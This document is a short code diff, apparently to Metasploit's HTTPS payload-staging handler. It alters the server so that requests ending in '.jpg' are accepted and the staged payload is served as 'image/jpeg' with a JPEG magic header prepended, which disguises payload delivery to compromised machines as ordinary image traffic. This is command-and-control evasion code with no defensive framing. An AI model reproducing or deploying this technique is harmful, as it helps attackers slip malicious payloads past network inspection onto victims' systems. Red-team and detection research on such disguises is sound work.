@@ -304,6 +304,10 @@ protected
   # Parses the HTTPS request
   #
   def on_request(cli, req)
+    if req.relative_resource =~ /\.jpg/
+      req.relative_resource.gsub!(/\.jpg/, "")
+    end
+
     Thread.current[:cli] = cli
     resp = Rex::Proto::Http::Response.new
     info = process_uri_resource(req.relative_resource)
@@ -383,8 +387,8 @@ protected
 
             print_status("Staging #{uuid.arch} payload (#{blob.length} bytes) ...")
 
-            resp['Content-Type'] = 'application/octet-stream'
-            resp.body = blob
+            resp['Content-Type'] = 'image/jpeg'
+            resp.body = "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46" + blob
 
           rescue NoMethodError
             print_error("Staging failed. This can occur when stageless listeners are used with staged payloads.")
